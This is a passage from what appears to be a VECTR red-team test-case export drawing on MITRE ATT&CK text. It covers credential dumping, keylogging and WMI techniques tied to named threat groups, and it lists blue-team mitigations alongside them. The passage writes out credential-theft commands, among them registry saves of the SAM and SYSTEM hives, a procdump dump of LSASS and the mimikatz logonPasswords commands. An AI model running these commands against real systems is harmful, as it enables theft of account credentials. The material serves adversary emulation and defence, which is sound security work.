user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used credential dumping tools such as [Mimikatz](https://attack.mitre.org/software/S0002) and [LaZagne](https://attack.mitre.org/software/S0349) to steal credentials to accounts logged into the compromised system and to Outlook Web Access.\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.\n---\nWindows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.\n---\nLimit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.\n---\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.\n---\nEnsure that local administrator accounts have complex, unique passwords across all systems on the network.\n---\n\nConsider disabling or restricting NTLM.\n---\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping to obtain account and password information.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b17a2f33-8d65-4ace-800c-be60f1dd22a9","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","relationship--0fa0f5d6-be0b-4a48-938c-6d9bb8b1a170","relationship--a6f27258-cf6a-4d75-a3f0-5de085d528d2","course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1","relationship--a266294c-18a7-4a6e-8291-a901748c929c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--ef79ec2f-fd7f-4f0b-851c-d215693987be","course-of-action--aeff5887-8f9e-48d5-a523-9b395e2ce80a","relationship--7e8ca453-aee5-48c1-a891-f44a742a95ed","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--fc31837d-530f-45e5-b9f8-bf6268c3ef03","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","relationship--7a3426bf-1751-43db-b844-6bf388a4c817","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--fe849763-78b9-4b8a-9219-2781ac7b00e8","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--ee8ef62a-fcde-44b0-aa63-4028dad703aa","course-of-action--49c06d54-9002-491d-9147-8efb537fbd26","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--43619944-94e9-43d9-a761-8e4db2113eef","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--b7930db8-2cb9-4ecf-b3d3-7425f99140d8","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["(Citation: GitHub LaZange Dec 2018)","Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018. https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017. https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump","Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018. https://github.com/Neohapsis/creddump7","Frecn, D.. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019. https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Lich, B. (2016, May 31). Protect derived domain credentials with Credential Guard. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017. https://adsecurity.org/?p=1729","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017. https://adsecurity.org/?p=1729","Microsoft. (2008, July 25). Credential Security Service Provider and SSO for Terminal Services Logon. Retrieved April 11, 2018. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)","Microsoft. (2012, November 29). Using security policies to restrict NTLM traffic. Retrieved December 4, 2017. https://technet.microsoft.com/library/jj865668.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved February 13, 2015. https://technet.microsoft.com/en-us/library/dn408187.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc228086.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017. https://msdn.microsoft.com/library/cc237008.aspx","Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018. https://msdn.microsoft.com/library/cc422924.aspx","Microsoft. (n.d.). How to grant the \"Replicating Directory Changes\" permission for the Microsoft Metadirectory Services ADMA service account. Retrieved December 4, 2017. https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017. https://msdn.microsoft.com/library/dd207691.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc245496.aspx","NSA IAD. (2017, April 20). Secure Host Baseline - Credential Guard. Retrieved April 25, 2017. https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017. https://wiki.samba.org/index.php/DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018. https://en.wikipedia.org/wiki/Active_Directory","Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018. https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/","Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017. https://source.winehq.org/WineAPI/samlib.html","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","### Windows\nMonitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [Valid Accounts](https://attack.mitre.org/techniques/T1078) if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)\n\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)\n\nConsider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)\n\n### Linux\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","Set and enforce secure password policies for accounts.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--563395f2-fa47-4e62-8228-57597c8b0be5","vectrId":"563395f2-fa47-4e62-8228-57597c8b0be5","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"563395f2-fa47-4e62-8228-57597c8b0be5","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Input Capture","variant":"Magic Hound - Input Capture - Pupy","objective":"Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware is capable of keylogging.[Pupy](https://attack.mitre.org/software/S0192) uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2","relationship--023ff141-8ed7-4132-85a0-494fe075236b","relationship--403863dd-5b73-4987-9397-e8c5b25041cc","course-of-action--da8a87d2-946d-4c34-9a30-709058b98996","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--811d0ef6-047f-4813-801e-33ebf1cae22a","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017. https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016. http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf","Wrightson, T. (2012, January 2). CAPTURING WINDOWS 7 CREDENTIALS AT LOGON USING CUSTOM CREDENTIAL PROVIDER. Retrieved November 12, 2014. http://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/"],"mitreId":"T1056"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078)."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--5c3f612f-48cd-461b-842a-03e929ec13eb","vectrId":"5c3f612f-48cd-461b-842a-03e929ec13eb","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"5c3f612f-48cd-461b-842a-03e929ec13eb","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Windows Management Instrumentation","variant":"MuddyWater - Windows Management Instrumentation","objective":"Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that leveraged WMI for execution and querying host information.By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.\n---\nPrevent credential overlap across systems of administrator and privileged accounts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055","relationship--1b6f869f-951c-4323-816f-dbedbe3aac0a","relationship--48e6b5fc-9d82-4cdf-84aa-bc23647e1234","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--1e0c4d65-a4db-42e0-9eb0-93354ad56d06","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--a2ee3987-f7c9-41ce-8aca-fae8e8c2ef9a","course-of-action--ba2ec548-fb75-4b8c-88d6-d91a77a943cf","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016. https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf","ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016. https://technet.microsoft.com/en-us/library/cc787851.aspx","Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016. https://msdn.microsoft.com/en-us/library/aa394582.aspx","Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016. https://en.wikipedia.org/wiki/Server_Message_Block"],"mitreId":"T1047"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to user accounts.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts. (Citation: FireEye WMI 2015)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--5d2507a5-e378-4d9f-812d-9f4321f0c74d","vectrId":"5d2507a5-e378-4d9f-812d-9f4321f0c74d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"5d2507a5-e378-4d9f-812d-9f4321f0c74d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"Magic Hound - Credential Dumping - Pupy - Mimikatz","objective":"Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style 